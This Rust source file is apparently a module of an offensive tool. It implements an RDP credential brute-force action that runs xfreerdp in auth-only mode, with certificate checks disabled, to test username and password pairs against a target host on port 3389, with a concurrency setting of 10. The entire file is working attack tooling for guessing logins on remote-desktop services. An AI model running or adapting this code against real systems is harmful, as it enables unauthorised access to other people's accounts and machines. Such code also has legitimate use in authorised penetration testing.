use std::time::Duration;

use tokio::process::Command;

use super::{BruteForceAction, Connector};

/// RDP connector — shells out to `xfreerdp` with `+auth-only`.
/// Matches Python's rdp_connector.py approach.
pub struct RdpConnector;

impl Connector for RdpConnector {
    fn try_connect(
        &self,
        ip: &str,
        port: u16,
        user: &str,
        password: &str,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = bool> + Send + '_>> {
        let ip = ip.to_string();
        let user = user.to_string();
        let password = password.to_string();
        Box::pin(async move { rdp_try_connect(&ip, port, &user, &password).await })
    }
}

async fn rdp_try_connect(ip: &str, port: u16, user: &str, password: &str) -> bool {
    // xfreerdp /v:<ip>:<port> /u:<user> /p:<password> /cert:ignore +auth-only
    let result = tokio::time::timeout(
        Duration::from_secs(15),
        Command::new("xfreerdp")
            .args([
                &format!("/v:{ip}:{port}"),
                &format!("/u:{user}"),
                &format!("/p:{password}"),
                "/cert:ignore",
                "+auth-only",
            ])
            .output(),
    )
    .await;

    match result {
        Ok(Ok(output)) => output.status.success(),
        _ => false,
    }
}

/// Create an RDP brute-force action for the action registry.
pub fn create_action() -> BruteForceAction<RdpConnector> {
    BruteForceAction::new(RdpConnector, "RDPBruteforce", "rdp", 3389, None, 10)
}
